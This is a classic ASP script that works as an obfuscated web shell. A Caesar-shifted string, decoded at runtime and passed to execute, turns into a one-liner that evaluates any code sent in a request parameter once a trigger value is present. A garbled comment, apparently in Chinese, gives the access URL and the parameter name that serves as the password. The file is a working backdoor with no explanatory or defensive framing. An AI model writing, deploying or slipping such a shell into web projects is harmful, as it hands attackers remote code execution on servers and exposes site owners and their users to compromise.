<%   
codeds="Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li"  
execute (decode (codeds) )   
Function DeCode (Coded)   
    On Error Resume Next  
    For i = 1 To Len (Coded)   
        Curchar = Mid (Coded, i, 1)   
        If Asc (Curchar) = 16 then   
            Curchar = chr (8)   
Elseif Asc (Curchar) = 24 then   
            Curchar = chr (12)   
Elseif Asc (Curchar) = 32 then   
            Curchar = chr (18)   
        Else    
            Curchar = chr (Asc (Curchar) -3)   
        End if   
        DeCode = Decode&Curchar   
    Next  
End Function  
'response.write(decode(codeds)) 
' ฒหตถมฌฝำ /hkmjj.asp?xx=x ,รÜย๋ hkmjj
%>